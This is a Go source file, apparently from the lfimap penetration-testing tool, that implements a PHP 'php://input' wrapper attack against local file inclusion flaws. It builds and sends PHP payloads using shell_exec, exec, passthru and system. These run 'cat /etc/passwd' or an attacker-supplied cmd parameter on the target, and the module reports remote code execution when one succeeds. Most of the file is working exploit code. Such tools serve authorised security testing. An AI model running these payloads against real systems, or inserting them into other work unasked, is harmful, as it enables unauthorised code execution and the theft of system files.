package attacks

import (
	"fmt"
	"strings"

	lfihttp "github.com/hansmach1ne/lfimap/internal/http"
)

// InputAttack implements PHP input wrapper attack
type InputAttack struct{}

// Name returns the attack name
func (a *InputAttack) Name() string {
	return "input"
}

// Test executes the input wrapper attack
func (a *InputAttack) Test(ctx *AttackContext, targetURL, postData string) bool {
	if ctx.Verbose {
		fmt.Printf("%s Testing with input wrapper...\n", ctx.Colors.Blue("[i]"))
	}

	placeholder := ctx.Config.Args.Placeholder
	headers := lfihttp.HeadersToMap(lfihttp.InitHeaders(
		ctx.Config.Args.UserAgent,
		ctx.Config.Args.Referer,
		ctx.Config.Args.Cookie,
	))

	// POST parameter mode
	if ctx.Config.Args.IsTestedParamPost {
		posts := []string{
			"<?php echo(shell_exec('cat /etc/passwd'));?>/*&" + strings.Replace(postData, placeholder, "php://input", -1),
			"<?php echo(exec('cat /etc/passwd'));?>/*&" + strings.Replace(postData, placeholder, "php://input", -1),
			"<?php echo(passthru('cat /etc/passwd'));?>/*&" + strings.Replace(postData, placeholder, "php://input", -1),
			"<?php echo(system('cat /etc/passwd'));?>/*&" + strings.Replace(postData, placeholder, "php://input", -1),
		}

		for i, p := range posts {
			u, reqHeaders, postTest := lfihttp.PrepareRequest(placeholder, "", targetURL, p, headers, ctx.Encodings)
			result := lfihttp.Request(ctx.HTTPCtx, u, reqHeaders, postTest, "RCE", "INPUT", false, false, false)

			if !result.DoContinue {
				return true
			}
			if i == 1 && ctx.Quick {
				return false
			}
		}
		return false
	}

	// GET parameter mode
	tests := []string{
		"php%3a%2f%2finput&cmd=cat%20%2Fetc%2Fpasswd",
		"php%3a%2f%2finput&cmd=ipconfig",
	}

	posts := []string{
		"<?php echo(shell_exec($_GET['cmd']));?>",
		"<?php echo(exec($_GET['cmd']));?>",
		"<?php echo(passthru($_GET['cmd']));?>",
		"<?php echo(system($_GET['cmd']));?>",
	}

	for _, test := range tests {
		u, reqHeaders, _ := lfihttp.PrepareRequest(placeholder, test, targetURL, postData, headers, ctx.Encodings)
		for j, post := range posts {
			result := lfihttp.Request(ctx.HTTPCtx, u, reqHeaders, post, "RCE", "INPUT", false, false, false)

			if !result.DoContinue {
				return true
			}
			if j == 1 && ctx.Quick {
				return false
			}
		}
	}

	return false
}
